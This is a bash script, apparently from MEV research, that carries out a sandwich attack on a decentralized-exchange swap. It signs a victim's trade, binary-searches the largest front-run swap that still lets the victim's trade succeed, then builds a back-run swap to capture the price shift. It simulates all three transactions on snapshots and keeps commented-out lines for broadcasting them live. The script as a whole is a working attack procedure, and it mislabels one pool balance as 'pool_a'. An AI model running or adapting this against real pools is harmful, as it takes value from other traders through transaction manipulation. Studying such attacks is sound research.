#!/bin/bash
set -e

source ./scripts/mev_utils.sh

CONTRACT_ADDRESS=`cat $CONTRACT_LOC/contractAddress.txt`
CODE_HASH=`cat $CONTRACT_LOC/codeHash.txt`

set_snapshot "${UNIQUE_LABEL}-start"

query_balances
echo "pool_a $(query_pool pool_a)"
echo "pool_a $(query_pool pool_b)"

# make victim tx
generate_and_sign_swap token_a 10 20 $VICTIM victim
echo "victim tx token_a 10 20"
echo

cnt=0
lo=0
hi=100
while [ $(expr $hi - $lo) -ne 1 ]; do
  set_snapshot "${UNIQUE_LABEL}-${cnt}"

  mid=$((($hi + $lo) / 2))
  echo "lo:$lo hi:$hi mid:$mid"

  generate_and_sign_swap token_a $mid 0 $ADV adv
  echo "adv tx token_a $mid 0"

  simulate_tx adv
  old_pool_a=$(query_pool pool_a)
  simulate_tx victim
  new_pool_a=$(query_pool pool_a)
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  echo 'dif' $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
  cnt=$((cnt + 1))
  echo "=================================== end of a trial"
  echo
done

set_snapshot "${UNIQUE_LABEL}-${cnt}"
echo "final front-run tx token_a $lo 0"
old_pool_b=$(query_pool pool_b)
simulate_tx adv
new_pool_b=$(query_pool pool_b)
dif_pool_b=$(($old_pool_b - $new_pool_b))
generate_and_sign_swap token_b $dif_pool_b 0 $ADV adv_back
echo "final back-run tx token_b $dif_pool_b 0"

echo
# broadcast all 3 txs
set_snapshot "${UNIQUE_LABEL}-final"
simulate_tx adv
simulate_tx victim
simulate_tx adv_back

## broadcast all 3 txs
#reset_snapshot
#broadcast_tx adv
#broadcast_tx victim
## send back-run tx
#execute_tx token_b $dif_pool_b 0 $ADV
#query_balances

query_balances
echo "pool_a $(query_pool pool_a)"
echo "pool_a $(query_pool pool_b)"